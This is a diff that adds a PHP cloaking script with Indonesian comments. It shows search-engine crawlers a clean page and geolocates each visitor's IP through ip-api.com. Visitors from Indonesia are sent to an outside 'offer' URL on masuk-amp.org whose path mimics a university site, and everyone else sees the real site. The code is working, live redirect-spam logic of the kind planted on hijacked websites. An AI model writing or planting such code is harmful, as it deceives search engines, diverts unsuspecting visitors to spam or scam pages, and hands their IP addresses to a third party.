@@ -1,0 +1,47 @@
+<?php
+// ================================
+// IP Indonesia + Bot + Real Page
+// ================================
+
+// Fungsi: Deteksi Bot berdasarkan User-Agent
+function isBot($ua) {
+    $bot_user_agents = [
+        'Googlebot', 'AdsBot', 'bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver', 'SemrushBot',
+        'AhrefsBot', 'MJ12bot'
+    ];
+    foreach ($bot_user_agents as $bot_ua) {
+        if (stripos($ua, $bot_ua) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Ambil IP dan User-Agent
+$ip = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+// Cek negara via API eksternal (ip-api.com)
+$geo = @json_decode(file_get_contents("http://ip-api.com/json/" . $ip), true);
+$negara = $geo['country'] ?? 'Unknown';
+
+// Log (opsional)
+// file_put_contents("log.txt", "IP: $ip | UA: $user_agent | NEGARA: $negara\n", FILE_APPEND);
+
+// Jika bot: tampilkan halaman bersih
+if (isBot($user_agent)) {
+    include("index-clean.html");
+    exit;
+}
+
+// Jika dari Indonesia: redirect ke offer
+if (strtolower($negara) === 'indonesia') {
+    header("Location: https://masuk-amp.org/amp/makerspace.ucsd.edu.html");
+    exit;
+}
+
+// Jika bukan IP Indo dan bukan bot: tampilkan website asli
+include("index-real.php"); // Pastikan ada file ini
+exit;
+?>
